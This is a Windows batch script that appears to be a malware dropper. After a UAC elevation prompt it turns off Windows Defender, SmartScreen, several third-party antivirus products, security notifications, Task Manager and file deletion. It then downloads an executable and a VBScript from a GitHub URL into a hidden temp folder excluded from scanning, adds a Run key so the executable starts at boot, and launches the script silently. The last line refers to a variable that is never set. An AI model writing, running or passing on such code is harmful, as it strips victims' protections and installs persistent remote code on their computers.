@echo off
setlocal

REM Check if the script is running with administrator privileges
net session >nul 2>&1
if %errorLevel% EQU 0 (
    goto admin
) else (
    goto elevate
)

:elevate
REM Use VBScript to elevate privileges
set "batchPath=%~0"
set "vbsGetPrivileges=%temp%\OEgetPriv_%random%.vbs"
echo Set UAC = CreateObject^("Shell.Application"^)>"%vbsGetPrivileges%"
echo UAC.ShellExecute "%batchPath%", "", "", "runas", 1 >>"%vbsGetPrivileges%"
"%SystemRoot%\System32\WScript.exe" "%vbsGetPrivileges%" %*
del "%vbsGetPrivileges%" /f /q
goto :eof

:admin

::external
taskkill /f /im SecHealthUI.exe >nul 2>&1
reg add "HKCU\Software\Policies\Microsoft\Windows\Explorer" /v DisableNotificationCenter /t REG_DWORD /d 1 /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableAntiSpyware" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "DisableRoutinelyTakingAction" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "PUAProtection" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v "ServiceKeepAlive" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableBehaviorMonitoring" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableIOAVProtection" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableOnAccessProtection" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v "DisableRealtimeMonitoring" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Reporting" /v "DisableEnhancedNotifications" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControlEnabled" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "ConfigureAppInstallControl" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\SmartScreen" /v "EnableSmartScreen" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender Security Center\Notifications" /v "DisableNotifications" /t REG_DWORD /d "1" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Spynet" /v "SubmitSamplesConsent" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\SpyNet" /v "SpyNetReporting" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotification" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\SOFTWARE\Policies\Microsoft\Windows\CurrentVersion\PushNotifications" /v "NoToastApplicationNotificationOnLockScreen" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Notifications\Settings\Windows.SystemToast.SecurityAndMaintenance" /v "Enabled" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "DefaultFileTypeRisk" /t REG_DWORD /d "1808" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Attachments" /v "SaveZoneInformation" /t REG_DWORD /d "1" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "LowRiskFileTypes" /t REG_SZ /d ".avi;.bat;.com;.cmd;.exe;.htm;.html;.lnk;.mpg;.mpeg;.mov;.mp3;.msi;.m3u;.rar;.reg;.txt;.vbs;.wav;.zip;" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Associations" /v "ModRiskFileTypes" /t REG_SZ /d ".bat;.exe;.reg;.vbs;.chm;.msi;.js;.cmd" /f >nul
reg add "HKCU\Software\Microsoft\Edge\SmartScreenEnabled" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\Software\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\Software\Policies\Microsoft\MicrosoftEdge\PhishingFilter" /v "EnabledV9" /t REG_DWORD /d "0" /f >nul
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\AppHost" /v "EnableWebContentEvaluation" /t REG_DWORD /d "0" /f >nul
reg add "HKLM\SYSTEM\CurrentControlSet\Services\MpKsl251b8453" /v "Start" /t REG_DWORD /d "4" /f >nul 2>&1
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cache Maintenance" /Disable >nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Cleanup" /Disable >nul
schtasks /Change /TN "Microsoft\Windows\Windows Defender\Windows Defender Verification" /Disable >nul
reg query "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EPP" >nul 2>&1 && reg delete "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EPP" /f >nul
reg copy "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
reg copy "HKLM\SOFTWARE\Classes\Drive\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
reg copy "HKLM\SOFTWARE\Classes\Directory\shellex\ContextMenuHandlers\EPP" "HKLM\SOFTWARE\Classes\*\shellex\ContextMenuHandlers\DefenderDisabled\EPP" /f >nul 2>&1
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Shell Extensions\Blocked" /v "{09A47860-11B0-4DA5-AFA5-26D86198A780}" /t REG_SZ /f >nul
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Defender\Features" /f /ve
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableBehaviorMonitoring /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableOnAccessProtection /t REG_DWORD /d 1 /f
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection" /v DisableScanOnRealtimeEnable /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SpynetReporting /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows Defender\Spynet" /v SubmitSamplesConsent /t REG_DWORD /d 2 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\AVAST Software\Avast" /v DisableAntiVirus /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\McAfee\Endpoint\AV" /v EnableOnAccessScan /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Symantec\Symantec Endpoint Protection\SMC" /v smc_enable /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\TrendMicro\PC-cillinNTCorp\CurrentVersion\Misc." /v AllowUnloading /t REG_DWORD /d 1 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\360Safe\SafeDog" /v Enable /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\KasperskyLab\protected\AVP13\settings" /v Enable /t REG_DWORD /d 0 /f
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\SecureMac" /v GlobalSwitch /t REG_DWORD /d 0 /f
REG ADD "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v "TamperProtection" /t REG_DWORD /d "1" /f


::internal
REM Disable Symantec Endpoint Protection's auto-protect feature
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Symantec\Symantec Endpoint Protection\AV" /v EnableAutoProtect /t REG_DWORD /d 0 /f
REM Disable a specific Windows feature using its feature ID
REM Note: change the feature ID (2093230218) to the one you want to disable
REG ADD "HKLM\SYSTEM\CurrentControlSet\Control\FeatureManagement\Overrides\0\2093230218" /v EnabledState /t REG_DWORD /d 0 /f
REM Disable Windows Defender's Tamper Protection feature
REG ADD "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f
REM Set the startup type of the Security Health Service to disabled
REG ADD "HKLM\SYSTEM\CurrentControlSet\Services\SecurityHealthService" /v Start /t REG_DWORD /d 4 /f
REM Disable Task Manager
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
REM Prevent file deletion in File Explorer
REG ADD HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer /v NoDelete /t REG_DWORD /d 1 /f
REM Enable the Admin Approval Mode for the built-in Administrator account
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v FilterAdministratorToken /t REG_DWORD /d 1 /f
REM Disable the UAC consent prompt for the built-in Administrator account
REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v ConsentPromptBehaviorAdmin /t REG_DWORD /d 0 /f

powershell Set-MpPreference -DisableTamperProtection $true
powershell Set-MpPreference -DisableRealtimeMonitoring $true
powershell Set-MpPreference -PUAProtection 0
powershell Set-MpPreference -SubmitSamplesConsent 1
powershell Set-ExecutionPolicy -ExecutionPolicy RemoteSigned
powershell Set-MpPreference -EnableSmartScreen CheckApps
powershell Set-MpPreference -QuickScanEnabled 0
powershell Add-MpPreference -ExclusionPath 'C:\*.exe'
powershell Set-MpPreference -ControlledFolderAccess Disabled

REM Create hidden and random folder
set "hiddenFolder2=%temp%\%RANDOM%%RANDOM%%RANDOM%%RANDOM%"
mkdir "%hiddenFolder2%"

REM Exclude hidden folder from Windows Defender
powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\Microsoft.exe'"
powershell -Command "Add-MpPreference -ExclusionPath '%hiddenFolder2%\myscript.vbs'"

REM Download payload files to hidden folder using curl
curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/myscript.vbs -o "%hiddenFolder2%\myscript.vbs"
curl -sS https://raw.githubusercontent.com/maxavison7/nothing/main/Microsoft.exe -o "%hiddenFolder2%\Microsoft.exe"

REM Set hidden attribute for files
attrib +h +s "%hiddenFolder2%\myscript.vbs"
attrib +h +s "%hiddenFolder2%\Microsoft.exe"

REM Add registry key to start Microsoft.exe on boot
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "Microsoft" /t REG_SZ /d "%hiddenFolder2%\Microsoft.exe" /f

REM Run payload silently and pass %hiddenFolder% variable
start /B "" wscript.exe "%hiddenFolder%\myscript.vbs" "%~dp0"

goto :eof
